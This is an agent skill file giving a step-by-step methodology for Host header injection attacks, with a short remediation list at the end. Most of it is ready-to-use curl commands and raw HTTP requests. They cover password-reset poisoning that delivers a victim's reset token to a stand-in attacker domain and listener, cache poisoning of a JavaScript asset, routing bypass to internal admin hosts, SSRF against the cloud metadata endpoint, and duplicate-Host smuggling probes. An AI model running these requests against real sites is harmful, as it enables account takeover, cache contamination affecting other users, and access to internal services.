---
name: host-header-injection
description: Exploit Host and X-Forwarded-Host header handling flaws for password reset poisoning, web cache poisoning, virtual host routing confusion, SSRF via host-based routing, and access control bypass on shared infrastructure.
---

# Host Header Injection

The `Host` header selects which site to serve, yet many applications trust it blindly when constructing absolute URLs — reset links, redirects, canonical tags, OAuth callbacks, asset paths. Because edge proxies and backends often disagree on parsing or validating `Host`, attacker-controlled values can reach security-critical server-side logic.

## When to use this skill

- The application generates absolute URLs from request input (reset emails, redirects).
- The target sits behind a reverse proxy, load balancer, or CDN forwarding client headers.
- Multiple virtual hosts share one IP and routing depends on `Host`.
- A cache (CDN, Varnish, Nginx `proxy_cache`) keys entries by URL only.
- The backend fetches resources (metadata, webhooks, imports) driven by the request.
- Access control differs between the edge tier and the origin server.

## Methodology

### 1. Probe Host header handling

Send a distinctive but harmless domain and inspect every response surface: status line, `Location`, body links, canonical tags, CSP, and emails.

```bash
curl -s -i -H "Host: evil-attacker.com" https://target.com/login
curl -s -i https://target.com/login | grep -iE "location|link|canonical"
```

```http
GET /login HTTP/1.1
Host: evil-attacker.com
```

Signals of exploitability: a `Location` header pointing at your domain (open redirect via Host), body links rewritten to your domain, reset emails arriving with attacker-controlled hosts, or differing status codes revealing which vhost the origin selected.

### 2. Password reset poisoning via Host fallback chain

When the app builds reset links from `Host`, poisoning rewrites the link sent to the victim. The token still belongs to the victim, so requesting it on your infrastructure captures it.

```http
POST /forgot-password HTTP/1.1
Host: evil-attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

If direct `Host` manipulation is blocked (proxy enforces an allowlist), applications frequently fall back to forwarded headers. Probe the whole chain — many stacks check `X-Forwarded-Host`, then `X-Host`, then `X-Forwarded-Server`, before defaulting to `Host`.

```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil-attacker.com
X-Host: evil-attacker.com
X-Forwarded-Server: evil-attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

Host your own listener (`python3 -m http.server 80`) and watch for the victim's `GET /reset?token=...` arriving with the valid token.

### 3. Web cache poisoning via Host-driven asset URLs

If the application uses `Host` to build URLs for scripts or styles, and a cache keys entries by path only, one poisoned request contaminates responses for every subsequent user.

```http
GET /resources/js/tracking.js?cb=1234 HTTP/1.1
Host: evil-attacker.com
X-Forwarded-Host: evil-attacker.com
```

If the response reflects the injected host inside the JavaScript body and is cached, all users requesting that path receive your payload. Confirm by fetching the same URL without the malicious header — a poisoned body proves cache contamination.

### 4. Virtual host routing confusion on shared IPs

On shared infrastructure the edge may route by `Host` while internal services assume requests arrived through the correct vhost. Send the internal admin vhost's hostname directly to the public IP.

```bash
curl -s -i -H "Host: admin.internal.target.com" https://PUBLIC_IP/
curl -s -i --resolve admin.target.com:443:PUBLIC_IP https://admin.target.com/admin
```

```http
GET /admin HTTP/1.1
Host: admin.internal.target.com
```

If the origin serves the admin panel based purely on `Host` without verifying the listening interface, you bypass the public routing tier and any access controls enforced only there.

### 5. SSRF when the backend fetches based on Host

Applications resolving URLs relative to the request `Host` — webhook validators, SSO metadata fetchers, importers, PDF generators — can be pointed at internal services.

```http
POST /api/import HTTP/1.1
Host: 169.254.169.254
Content-Type: application/json

{"url": "/latest/meta-data/"}
```

```http
GET /fetch?path=/admin HTTP/1.1
Host: internal-admin.svc.cluster.local
```

Vary the port embedded in the reconstructed URL to port-scan internal services, and pivot to cloud metadata endpoints where egress controls are absent.

### 6. Absolute URL request line overriding Host

Per RFC 7230, when a proxy receives an absolute URI in the request line, any `Host` header must be ignored. Some backends honor this; front-ends may not, creating a discrepancy exploitable for cache poisoning and routing bypass.

```http
GET http://evil-attacker.com/resources/js/tracking.js HTTP/1.1
Host: target.com
```

If the backend treats the request as destined for `evil-attacker.com` while the cache keys it under `target.com/resources/js/tracking.js`, the poisoned response is stored under the legitimate origin's key.

### 7. Duplicate and malformed Host headers for smuggling crossover

Front-end and back-end disagreement on duplicate or malformed `Host` headers is a classic request smuggling primitive (CL.0 and TE.CL variants). Probe how many `Host` headers each tier tolerates.

```http
GET / HTTP/1.1
Host: target.com
Host: evil-attacker.com

```

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 44

GET /admin HTTP/1.1
Host: internal.only
```

Also test malformed forms — port confusion, whitespace, absolute-form duplicates — since some stacks reject while others silently take the first or last occurrence:

```http
GET / HTTP/1.1
Host: target.com:443
Host: target.com:8443

```

### Remediation

- Validate `Host` against a strict allowlist at the reverse proxy; reject unexpected values.
- Strip or overwrite `X-Forwarded-Host`, `X-Host`, and `X-Forwarded-Server` at the edge; never trust them from clients.
- Configure absolute URLs from server-side configuration, never from request headers.
- Include `Host` in cache keys, or disable caching of Host-derived responses.
- Reject duplicate or malformed `Host` headers with `400 Bad Request` at every tier.
- Enforce consistent parsing between front-end and back-end; disable absolute-URL override unless required.
- Restrict backend egress; block link-local and internal ranges for Host-driven fetches.
